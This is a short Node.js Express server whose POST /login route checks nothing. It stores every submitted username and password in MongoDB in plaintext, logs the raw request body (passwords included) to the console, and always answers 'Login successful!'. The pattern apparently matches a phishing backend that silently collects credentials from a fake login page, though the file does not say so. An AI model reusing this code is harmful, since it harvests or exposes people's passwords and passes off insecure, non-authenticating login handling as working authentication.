require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static("public")); // Serves static files

// Connect to MongoDB
mongoose.connect(process.env.MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
.then(() => console.log("✅ Connected to MongoDB"))
.catch((err) => console.error("❌ MongoDB Connection Error:", err));

// Load User Model
const User = require("./User");

// Routes
app.post("/login", async (req, res) => {
  console.log("POST /login", req.body);

  const { username, password } = req.body;

  try {
    if (!username || !password) {
      return res.status(400).send("Username and password are required");
    }

    const newUser = new User({ username, password });
    await newUser.save();
    res.status(200).send("Login successful!");
  } catch (err) {
    console.error("❌ Error saving user:", err);
    return res.status(500).send("Error saving user to database");
  }
});

app.listen(port, () => {
  console.log(`🚀 Server is running on port ${port}`);
});
